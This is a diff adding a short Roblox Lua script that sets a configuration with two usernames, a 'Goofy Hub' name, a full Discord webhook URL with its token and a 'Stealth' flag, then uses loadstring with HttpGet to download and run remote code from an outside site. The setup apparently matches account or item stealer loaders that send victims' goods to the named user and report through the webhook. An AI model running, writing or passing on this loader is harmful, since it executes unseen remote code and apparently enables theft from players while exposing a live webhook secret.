@@ -1,0 +1,12 @@
+getgenv().Features = {
+    Username = "jrtiger75",
+    Alt = "flamingofkaden"
+    HubName = "Goofy Hub",
+    Webhook = "https://discord.com/api/webhooks/1094463561213952020/v4JtSkwdQX0nXL9zh1V78WUXPWEqf_QgRlN2XSAzLQoETpLTgXrlhfwoo0Fufc05rogl",
+    Premium = {
+        Key = "",
+        Stealth = false
+    }
+}
+
+loadstring(game:HttpGet("https://voidscripts.site/scripts/mb/script.lua"))()
